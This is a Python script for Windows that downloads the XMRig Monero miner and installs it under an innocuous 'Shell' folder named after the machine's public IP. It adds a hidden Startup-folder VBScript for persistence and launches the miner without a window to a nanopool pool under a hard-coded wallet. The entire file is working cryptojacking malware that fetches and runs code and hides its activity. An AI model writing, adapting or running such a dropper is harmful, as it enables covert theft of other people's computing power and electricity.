import os
import zipfile
import subprocess
import sys
import ctypes
import requests
import shutil
import threading

def is_admin():
    """Check if the script is being run with administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def download_file(url, destination):
    """Download a file from a URL to a specified destination."""
    try:
        with requests.get(url, stream=True) as response:
            response.raise_for_status()
            with open(destination, "wb") as file:
                for chunk in response.iter_content(chunk_size=1024):
                    if chunk:
                        file.write(chunk)
    except requests.exceptions.RequestException as e:
        print(f"Error downloading file: {e}")
        return False
    return True

def extract_zip(zip_file, extract_dir):
    """Extract the zip file to the specified directory."""
    try:
        with zipfile.ZipFile(zip_file, "r") as zip_ref:
            zip_ref.extractall(extract_dir)
    except zipfile.BadZipFile:
        print("Error extracting the zip file.")
        return False
    return True

def create_startup_vbs(xmrig_path, startup_path, bitcoin_address):
    """Create a VBScript to run xmrig on startup."""
    try:
        with open(startup_path, "w") as vbs_file:
            vbs_file.write(f'''Set WshShell = CreateObject("WScript.Shell") 
    WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {bitcoin_address} --tls --coin monero", 0, False
    ''')
    except IOError as e:
        print(f"Error creating startup VBScript: {e}")
        return False
    return True

def run_xmrig(xmrig_path, bitcoin_address):
    """Run xmrig in the background."""
    try:
        subprocess.Popen(
            [xmrig_path, "-o", "xmr-us-east1.nanopool.org:14433", "-u", bitcoin_address, "--tls", "--coin", "monero"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        print(f"Error running xmrig: {e}")
        return False
    return True

def show_message_box(message, title):
    """Display a message box using ctypes (no third-party libraries)."""
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)

def get_public_ip():
    """Retrieve the user's public IP address."""
    try:
        response = requests.get("https://api.ipify.org?format=json")
        response.raise_for_status()
        return response.json().get("ip")
    except requests.exceptions.RequestException:
        print("Error retrieving public IP address.")
        return None

def move_extracted_files(src_dir, dest_dir):
    """Move extracted files to the destination directory."""
    for item in os.listdir(src_dir):
        source_item = os.path.join(src_dir, item)
        destination_item = os.path.join(dest_dir, item)
        if os.path.isdir(source_item):
            shutil.move(source_item, destination_item)
        else:
            shutil.move(source_item, destination_item)

def main():
    if not is_admin():
        show_message_box("This script must be run as Administrator!", "Admin Privileges Required")
        sys.exit(1)

    URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
    FILENAME = "C:\\Program Files (x86)\\Shell\\xmrig-6.22.2-gcc-win64.zip"
    EXTRACT_BASE_DIR = "C:\\Program Files (x86)\\Shell"
    BITCOIN_ADDRESS = "82WFpBT3pLrBHDHXpe5TL2cQLEepYDieiDMZADyb3pHLd8oQCrMLs44WCi8vBN3aT8AkbRXnhry5JFEdyS9nzWSP6jDNWn1"
    STARTUP_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "xmrig_startup.vbs")

    # Retrieve the public IP address to use as the folder name
    public_ip = get_public_ip()
    if not public_ip:
        print("Unable to retrieve public IP, aborting.")
        sys.exit(1)

    # Ensure the extraction directory exists
    EXTRACT_DIR = os.path.join(EXTRACT_BASE_DIR, public_ip)
    os.makedirs(EXTRACT_DIR, exist_ok=True)

    # Download the zip file in a separate thread
    download_thread = threading.Thread(target=download_file, args=(URL, FILENAME))
    download_thread.start()
    download_thread.join()  # Wait for download to complete

    # Extract the zip file after downloading
    temp_extract_dir = os.path.join(EXTRACT_BASE_DIR, "temp_xmrig")
    if not extract_zip(FILENAME, temp_extract_dir):
        sys.exit(1)

    # Find the extracted xmrig directory and move its contents
    extracted_folders = [f for f in os.listdir(temp_extract_dir) if os.path.isdir(os.path.join(temp_extract_dir, f)) and "xmrig" in f.lower()]
    if extracted_folders:
        extracted_dir = os.path.join(temp_extract_dir, extracted_folders[0])

        # Move extracted files to the IP-named folder
        move_extracted_files(extracted_dir, EXTRACT_DIR)

        # Clean up the temporary extraction folder
        shutil.rmtree(temp_extract_dir)

        # Define the path to the xmrig executable
        xmrig_path = os.path.join(EXTRACT_DIR, "xmrig.exe")

        # Clean up previous startup script if exists
        if os.path.exists(STARTUP_PATH):
            os.remove(STARTUP_PATH)

        # Create the startup VBScript
        if not create_startup_vbs(xmrig_path, STARTUP_PATH, BITCOIN_ADDRESS):
            sys.exit(1)

        # Run xmrig in the background
        if not run_xmrig(xmrig_path, BITCOIN_ADDRESS):
            sys.exit(1)

        # Clean up the downloaded zip file after use
        os.remove(FILENAME)

if __name__ == "__main__":
    main()
